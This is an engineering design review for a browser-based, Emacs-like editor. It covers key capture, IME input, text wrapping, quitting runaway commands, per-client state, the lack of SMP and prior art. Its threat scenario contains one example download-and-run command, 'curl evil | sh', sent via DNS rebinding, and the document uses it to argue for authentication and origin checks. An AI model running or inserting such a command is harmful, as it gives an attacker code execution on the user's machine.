# Lane 5: Beyond Emacs, browser realities, server realities, Gerbil realities, prior art

Scope: browser constraints (keys, clipboard, IME, text measurement, scroll, a11y, touch), server realities (security, multi-client, collaboration, crash isolation, upgrades, performance), Gerbil/Gambit realities (SMP, FFI), and prior art. ADR 7 and ADR 2 get special attention. Read: `tuna/docs/overview.md`, ADRs 1-7, `tuna/frontend/tuna-keyboard.ts`, `tuna/docs/roadmap.md`, `gerbil-webview`, `gerbil-libghostty` (README + browser-terminal example), local Gambit manual, `/opt/gerbil` runtime. Web facts cited by URL. **Shallow areas:** Safari behaviour (no Safari tested; claims come from third-party reports), tree-sitter in Gerbil (only a negative search), Pharo/Light Table/Kakoune/Helix/Jupyter (from background knowledge, little verified), exact PWA/app-mode/kiosk key behaviour (needs an empirical test; see Open question 1).

Notation: **[F]** fact with a source, **[I]** my inference, **[U]** unverified.

## Summary

1. **Corner risk (security): the design never mentions authentication.** `POST /commands` runs arbitrary editor commands, and ADR 2 says plugins are trusted in-process code with no sandbox. Any command can reach `eval` or a shell. An unauthenticated localhost endpoint is therefore remote code execution for any web page the user visits (CSRF, DNS rebinding) and for any other local user. The existing `libghostty` browser demo already does loopback bind plus Host/Origin checks. Tuna must commit to a per-launch secret, Host/Origin checks, and loopback/Unix-socket binding before the first prototype.
2. **Corner risk (keys): the three Emacs keys C-n, C-t, C-w cannot be captured in an ordinary Chrome tab** (nor, per reports, Safari; Firefox reserves them too). `navigator.keyboard.lock()` exists only in Chromium, only in fullscreen, and needs a permission prompt since Chrome 130. ADR 7's "browser is a terminal" assumes full key access. The fix is a launch mode (app window / native webview shell / PWA) plus a key-translation layer and an ESC-prefix fallback, all committed as part of the keyboard plugin contract.
3. **Corner risk (input): ADR 7 bans `contenteditable`/`<textarea>` and expects composition events.** Composition events, dead keys, the Android virtual keyboard (keydown reports `Unidentified`/229) and screen-reader caret tracking all require a focused editable element. Allow a hidden *input proxy* element (Ace/CodeMirror/Monaco technique). It is not the buffer; it only feeds input and gives AT a focus target.
4. **Corner risk (wrapping/measurement): the server cannot measure text, but ADR 7 plans server-side viewport slicing in lines.** Visual-line motion, `current-column`, `window-width`, horizontal windowing and very long lines all depend on wrapping. Commit now to a **monospace cell-grid model**: server wraps by columns using Unicode width tables, the client only reports cols/rows and cell size. Xi's retrospective names word-wrap-with-async-frontend as its worst race.
5. **Corner risk (runaway command / C-g): ADR 3 enqueues input and processes it on the loop, so a command in an infinite loop holds the baton and C-g can never arrive.** Add an out-of-band quit lane in the web thread (interrupt the command thread) and a baton watchdog. Also note that on the installed non-SMP runtime a blocking C call (FFI) stalls every Scheme thread.
6. **Corner risk (clients): events carry no client identity, ADR 3 has one global key-sequence state, ADR 6 stores point on the buffer, and ADR 4/7 use "frame" for two different things.** Per-tab frames (emacsclient analogue), multiple windows on one buffer, and collaboration all need per-client/per-window selection state. Cheap now (add a tab id to events, move point to the window/view), expensive later.
7. **SMP is not available.** The installed `/opt/gerbil` reports `(gerbil-runtime-smp?)` = `#f`, Gambit's `--enable-smp` defaults to NO, and the manual says the runtime does not use multiprocessors. ADR 3's wording is accurate but the overview's "Slow work ... can't freeze" is only true by preemption, not parallelism. Plan jobs as serialisable plain-data work so they can also run in subprocesses.
8. **Browser reality for scrolling/perf:** server-command scrolling will feel laggy on wheel/touch; commit to a viewport contract with overscan and a client-side scroll position report. Datastar Rocket is optional, not required.
9. **Best divergences:** receipts-backed plugin lifecycle (already in ADRs), node-tree buffers with moldable per-kind views (Glamorous Toolkit style), plumbing-style typed text actions (Acme), selection-first editing as an alternative command layer (Kakoune/Helix), per-client frames with a shared editor, and a two-lane clipboard (own kill ring, explicit OS sync).
10. **Do not commit to:** CRDT/OT, out-of-process plugins by default, sandboxing, client-side editing components. Xi's retrospective is the strongest warning: async/multi-process/CRDT cost far more than they paid back for a single-user editor.

## Corner risks

### 1. No authentication or origin policy on a command-executing localhost server (security)
- **Capability:** safe operation on a multi-user machine and a browser that visits arbitrary sites.
- **Cause:** ADR 7 "Input. ... `POST`s them in order to `/commands`" with no auth; ADR 2 "Plugins are trusted in-process code. There is no sandbox." The existing client sends `credentials: "same-origin"` only. **[I]** a command like `eval-expression` or `shell-command` is an ordinary plugin command, so command injection equals code execution as the user.
- **Scenario:** The owner opens a malicious page while Tuna listens on `127.0.0.1:8080`. Via DNS rebinding the page's JS gets same-origin access to `/commands` and `/subscribe`, reads frames (private buffers) and sends keys such as `M-x shell-command RET curl evil | sh RET`. Separately another local user can hit the port directly.
- **Evidence:** DNS rebinding bypasses the same-origin policy for local servers; Host/Origin validation is the standard defence ([GitHub Blog](https://github.blog/security/application-security/dns-rebinding-attacks-explained-the-lookup-is-coming-from-inside-the-house/), [host-validation](https://github.com/brannondorsey/host-validation/)). The sibling project `gerbil-libghostty/examples/browser-terminal` already binds IPv4 loopback only and checks Host and Origin, and states "Do not expose it through a proxy or tunnel."
- **Smallest ADR change:** add to ADR 7: bind loopback (or Unix socket) only; reject requests whose Host is not the exact bound host:port and whose Origin is present but different; require a per-launch random token (in the launch URL, then an `HttpOnly; SameSite=Strict` cookie plus a header on `/commands`); `/subscribe` requires the same cookie. State in ADR 2 that the trust boundary is *the authenticated browser session*, equal to shell access. No code change to the plugin model.

### 2. Reserved browser shortcuts (C-n, C-t, C-w, C-Tab) cannot be captured in a tab
- **Capability:** the Emacs core keymap in a normal browser tab.
- **Cause:** ADR 7 "the browser acts like a terminal"; the keyboard plugin assumes `preventDefault()` works for every key.
- **Scenario:** The user presses C-w to kill a region. Chrome closes the tab, losing the session view (state survives on the server, but flow breaks). C-n opens a new window; C-t opens a tab. These are three of the most frequently used Emacs keys.
- **Evidence:** see inventory #1-#6. Keyboard Lock exists only in Chromium, only in fullscreen, needs permission (Chrome 130+), Firefox and Safari decline to implement.
- **Smallest change:** ADR 7 should say: (a) primary supported launch modes are a native webview shell (`gerbil-webview`, Linux today) and a Chromium `--app` window, which must be empirically verified for these keys; ordinary tabs are best-effort; (b) the keyboard plugin reports `display-mode` and Keyboard Lock state, and the server can list unreachable bindings; (c) keymap resolution includes a translation stage (so `C-x C-w`-style or ESC-prefix alternatives can stand in); (d) the key record gains `altGraph`. No change to ADR 3/4.

### 3. "No `contenteditable`/`<textarea>`" blocks IME, dead keys, mobile, and AT
- **Capability:** text entry in non-US layouts and on touch devices; screen-reader caret.
- **Cause:** ADR 7 consequences: "Browser-owned editing widgets ... are not used for buffers; text input arrives as key and composition events."
- **Scenario:** A Japanese user starts composing. Without a focused editable element the browser never starts composition, so there are no `compositionstart/update/end` events to send. On Android every keydown has `key = "Unidentified"`/keyCode 229, so typing "a" arrives as nothing useful.
- **Evidence:** CodeMirror and Ace use a hidden focusable element precisely so the browser believes it is the editor ([Marijn: faking an editable control](https://marijnhaverbeke.nl/blog/browser-input-reading.html)); "IME ... and pretty much all Android virtual keyboard input ... is its own special kind of hell" ([CodeMirror 6 update](https://marijnhaverbeke.nl/blog/codemirror-6-progress.html)). The EditContext API is the intended replacement but is Chromium-only (Chrome 121+, no Firefox/Safari) ([MDN](https://developer.mozilla.org/en-US/docs/Web/API/EditContext_API), [caniuse](https://caniuse.com/mdn-api_editcontext)).
- **Smallest change:** reword ADR 7 so the ban applies to *buffer content*: "buffer text is never edited by the browser; the keyboard plugin may keep one hidden, always-focused input proxy to receive composition, `beforeinput` and paste events, which it forwards as events and then clears." Keep `keydown` for chords.

### 4. Server-side viewport in lines, with no model for wrapping, columns or long lines
- **Capability:** soft wrap, visual-line motion, `current-column`, narrow windows, huge single lines, horizontal scrolling.
- **Cause:** ADR 7 Viewport: "Text nodes render only the lines visible in their window, plus a small margin," while ADR 7 also states the server renders HTML and the browser lays it out. The server cannot know how many visual rows a logical line occupies.
- **Scenario:** A 3 MB minified JSON file on one line: the "visible line" is the whole file, so every frame is megabytes and the browser lays it out. Or: C-n in a wrapped paragraph should move one visual row, but the server does not know where the browser wrapped.
- **Evidence:** Xi lost months on scrolling and word wrap between frontend and core: "adding async made everything more complicated ... word wrap ... races between editing actions and word wrap updates" ([retrospective](https://raphlinus.github.io/xi/2020/06/27/xi-retrospective.html)). The libghostty demo's solution: the browser sends measured geometry, the server owns the cell model (`browser-terminal/README.md`: "ordered raw key, paste, pointer, wheel and measured geometry facts").
- **Smallest change:** ADR 7: the *window* geometry (columns, rows, cell width/height) is a client-reported fact stored per window; text nodes lay out on a **cell grid** (code-point/grapheme widths from Unicode tables, tab stops, soft wrap by columns, long lines split into row chunks) and the renderer emits explicit rows. Viewport slicing is in *visual rows*. Proportional/pixel layout is only for rich nodes and is rendered by CSS. Accept the cost: ligatures off, emoji width mismatches depend on font fallback (mitigate by wrapping each wide grapheme in a fixed-width cell).

### 5. Runaway commands: C-g cannot interrupt, no watchdog
- **Capability:** keyboard quit; recovery from buggy plugins; the whole "trusted in-process" model (ADR 2).
- **Cause:** ADR 3 "The loop dequeues events, resolves keys ... and runs the resulting command" (so the quit key waits in the queue behind the runaway command) and "Long-running Scheme computation in a command ... delays subsequent commands."
- **Scenario:** A plugin command loops forever on the editor baton. Every tab freezes (browsers still show the last frame); C-g sits in the queue. The user must kill the server (losing unsaved work to the last autosave). This is the failure mode ADR 3 sells itself as preventing, but only for jobs, not commands.
- **Evidence:** Emacs solves this by setting `quit-flag` in the input interrupt handler, not in the queue (Elisp manual node "Quitting" **[I]**; verify). Gambit threads are preemptive (ADR 3), so the web thread keeps running while the command thread loops **[I]**; the manual notes the runtime currently runs one thread at a time (`gambit.txi:9846`), so a *C* call that does not yield cannot be interrupted at all.
- **Smallest change:** ADR 3 adds: "the input path recognises the configured quit chord before enqueueing and interrupts the running command thread (terminate or raise a `quit` condition at its next safe point), and a watchdog may do so after a configurable runtime. Quitting unwinds with `unwind-protect`; partial edits remain (as in ADR 4)." Also: commands may be asked to check a cheap `quit-requested?` in loops.

### 6. Client identity, per-client selection state, and the overloaded word "frame"
- **Capability:** per-tab frames (emacsclient -c), two windows on one buffer with different points, multiple devices, collaboration cursors.
- **Cause (a):** ADR 7 Sessions: "every browser tab mirrors the same editor frame". The keydown record has no tab/connection id (`tuna-keyboard.ts`), and the key-sequence state is one global.
- **Cause (b):** ADR 6 "A buffer's focus is a node plus, for a text node, a point" puts point on the buffer, though ADR 6's own context lists "per-view point and scrolling" as a source of earlier failure. In Emacs, point is per window for non-selected windows (window-point).
- **Cause (c):** ADR 4 lists "frames" as editor objects and ADR 7 defines "Frame: one complete drawing of the screen" (overview glossary). Emacs "frame" = an OS-level window with a window tree and a minibuffer; the Tuna overview "frame" = a rendered snapshot. These collide.
- **Scenario:** Two tabs open; tab A types `C-x`, tab B types `b`: the server resolves `C-x b` across tabs. Or the user splits a window on the same buffer in an Emacs-like way and expects independent cursors.
- **Smallest change:** (1) add `client` (random per-tab id kept in `sessionStorage`; cookies are shared between tabs) to the event record now (version bump while there is one client); (2) key-sequence/prefix state belongs to the *input target* (client frame), not the loop; (3) rename the rendered snapshot to **screen update** or **render** in prose and reserve **frame** for the Emacs meaning, or the reverse, but decide before the term spreads into code; (4) state in ADR 6 that point/scroll live on a *view* (window) object and the buffer keeps only a default/last point, as Emacs does.

### 7. (Lower) SMP assumed on a runtime that has none
- **Capability:** parallel jobs (highlighting, search, indexing).
- **Cause:** ADR 3: "Today Gerbil runs them on one OS thread; the Gerbil developers are enabling SMP" and "When SMP lands, jobs gain real parallelism with no API change."
- **Evidence:** installed runtime reports SMP off; `--enable-smp` default NO (`gambit/configure:1881`); Gambit manual says no multiprocessor use; MOP paths not SMP-safe (ADR 3). The statement is not wrong, but nothing in Tuna's roadmap may depend on it.
- **Smallest change:** ADR 3: jobs take and return *serialisable plain data* (no closures, no live objects) so the same job can run in an SMP thread, or in a subprocess, interchangeably. Cost: none today. Avoid claiming in docs that jobs run in parallel.

### 8. (Lower) Plugin reload strands plugin state
- **Capability:** reload without losing plugin state.
- **Cause:** ADR 2 "Reload ... deactivate its plugins, reload its modules, activate again" and ADR 4 "Plugins define their own state objects" (`defclass`). Reloading re-evaluates the class; old instances belong to the old class.
- **Smallest change:** ADR 2: reload is defined as "save session slots -> deactivate -> reload -> activate -> restore slots" so state crosses reload only as plain versioned data (ADR 5). State not in a slot is explicitly lost on reload.

## Proposed divergences (improvements over Emacs)

1. **Receipts instead of `unload-feature`** (already in ADR 2). Cost: every core API that creates long-lived effects must be context-aware. Port impact: ported packages that mutate globals directly (`setq` on keymaps, `add-hook` to a global, `advice-add`) must go through context-aware wrappers, or they have no receipt and are "the package's own responsibility" (ADR 2).
2. **Static plugin manifest with lazy activation (VS Code activation events/contribution points).** Emacs: `autoload` cookies and `eval-after-load`, generated into `loaddefs`. Tuna: a `defplugin` manifest declaring commands, keys, file patterns, and service requirements, readable without running code, so menus, `M-x` completion, help and dependency resolution work before activation, and startup stays fast. Cost: duplicate declarations unless the macro generates the manifest. Porting: Emacs `;;;###autoload` maps mechanically to manifest entries.
3. **Per-client frames over one editor** (emacsclient analogue, but multi-device): each tab owns selected window, minibuffer focus, key-sequence state. Better than Emacs because frames are cheap and the browser handles geometry. Cost: all "selected window/frame" accessors become per-client; Emacs code that assumes one selected window per process works if commands execute with the originating client's context. Porting: `selected-window`, `selected-frame`, `minibuffer-window` stay valid; code that loops over `frame-list` sees tabs.
4. **Plumber: typed, extensible actions on rendered text/nodes** (Acme/Plan 9). Emacs has `ffap`, `browse-url`, `button.el`, embark; they are separate mechanisms. Tuna: one service resolving (node kind, text, context) to candidate actions, offered on click, RET and a menu. Cost: needs stable node identity and offsets (ADR 7 already). Porting: `button.el` and `ffap` can register plumbing rules.
5. **Selection-first command layer (Kakoune/Helix) as a plugin**, with multi-selection (list of marker ranges) in the buffer layer rather than single point/mark. Cost: ADR 6 buffer focus must allow several selections; most Emacs commands assume one point. Porting: commands operate on the primary selection; `multiple-cursors`/`iedit` become native.
6. **Moldable views per node kind** (Glamorous Toolkit): any node kind can have several views (summary, tree, raw, table) switchable by the user, defined by plugins without editing the owner. Cost: renderer service surface grows. Porting: Emacs major modes that build special buffers (`magit-status`, `dired`, `package-list`) become node-tree buffers rather than text with text properties; there is no mechanical port.
7. **Two-lane clipboard:** Tuna kill ring is authoritative; OS clipboard sync happens only at defined gestures (copy key on the client, `paste` event on the input proxy). Better than Emacs's implicit `interprogram-cut-function` because it works under browser permission rules. Cost: no X11 PRIMARY, no background clipboard polling. Porting: `kill-new`/`current-kill`/`yank` keep semantics; `gui-get-selection` stays unsupported.
8. **Cell-grid text layout with server-owned wrapping** (the libghostty model) as the *only* text layout, with pixel layout reserved for rich nodes. Emacs computes layout in C with real font metrics; Tuna gives up per-glyph pixel precision for server determinism and testability. Cost: variable-pitch text nodes, ligatures, and emoji width can look wrong. Porting: code using `window-text-pixel-size`, `string-pixel-width`, display `:align-to` pixel specs needs a cell-based fallback.
9. **Replayable input log** (opt-in) for deterministic bug reports and tests: versioned key events (already the transport format) in an append-only file with secret-entry redaction. Emacs has `open-dribble-file` (unstructured). Cost: privacy handling.
10. **Out-of-band quit** (Corner risk 5) is an improvement over Emacs in that it can also be exercised by a second client or an admin endpoint, e.g. "interrupt editor" from another tab.

## Open questions for the owner

1. **Primary launch mode and key reservation.** Context: C-n/C-t/C-w are unavailable in ordinary Chrome/Safari tabs (and reportedly Firefox), and no experiment on this machine yet establishes how they behave in an installed PWA, `chromium --app`, or `gerbil-webview`. Options: (a) accept that Tuna is first used in a native/app window and best-effort in tabs; (b) require remapping defaults so no default binding uses C-n/C-t/C-w; (c) ship an Emacs default keymap with reserved-key alternates. Recommendation: **(c) plus a short empirical test** (a tiny test page that logs which chords arrive, run in Chrome tab, Chrome app mode, installed PWA, Firefox tab, `gerbil-webview`). That test is the first thing to build for Lane 5 and takes an hour.
2. **Wrapping model.** Context: the server cannot measure fonts. Options: (a) monospace cell grid, server wraps; (b) browser wraps, client reports row breaks asynchronously; (c) hybrid (grid for code, CSS for prose nodes). Recommendation: **(a) for all text nodes at first, (c) later**. Cost: no true proportional text in editable buffers.
3. **Performance budgets.** Context: ADR 7 says latency will be measured. Options: set explicit pass/fail now. Recommendation: p95 keydown-to-painted <= 50 ms on localhost for a 200x60 viewport with a 1 MB file, frame payload <= 100 KB typical, no stall beyond 1 frame on a 5 MB single-line file. These are my proposals (**[I]**), not evidence-derived; the owner should confirm.
4. **Threat model statement.** Is "anyone with the token has full shell access" the accepted model? If remote multi-user or shared-server use is ever wanted, ADR 2's no-sandbox decision needs revisiting (not now). Recommendation: write the statement into ADR 2; default off for non-loopback.
5. **Accessibility target.** Is screen-reader support a goal for v1, or "do not preclude"? Recommendation: do not preclude (input proxy + live region + stable ids), defer testing with a real reader.
6. **Mobile/touch.** First-class or "does not break"? Recommendation: "does not break" until the keyboard story is settled.
7. **Collaboration.** Product goal or non-goal? Recommendation: non-goal for now; keep change records client-tagged; revisit with Xi's retrospective in hand.

## What to commit to now versus defer

**Commit now (cheap, hard to retrofit):**
- Per-launch auth token + Host/Origin checks + loopback/Unix-socket bind (Corner risk 1).
- Event schema: add `client` id, `altGraph`, and keep versioning; key resolution through a translation stage; ESC-prefix fallback; do not `preventDefault` browser-owned chords on a configurable passthrough list.
- Hidden input proxy permitted by ADR 7 (composition, `beforeinput`, `paste`).
- Cell-grid text layout owned by the server; window geometry reported by the client; viewport in visual rows; long-line chunking contract.
- Out-of-band quit lane and baton watchdog.
- Per-client input-target state; point/scroll on a view object; rename "frame" in docs or code.
- Job inputs/outputs are serialisable plain data (works for green threads, SMP, or subprocess).
- Reload = slot save/restore around reactivation.
- Default launch tooling: a `tuna` command that opens the app window/native shell.

**Defer (design when needed):**
- CRDT/OT and shared cursors (keep change records client-tagged).
- Out-of-process or sandboxed plugins (keep "service via RPC proxy" possible).
- Datastar Rocket and client-side scroll (define the overscan contract now, implement later).
- Keyboard Lock integration (optional enhancement for Chromium fullscreen).
- Tree-sitter, PTY, file-notify integration details (use helper-process pattern for risky natives).
- Plugin manifest/lazy activation and the plumber service.
- Selection-first multi-cursor (keep selections a list in the buffer layer).
- Touch UI, bidi, proportional fonts.
- SMP-dependent parallelism.
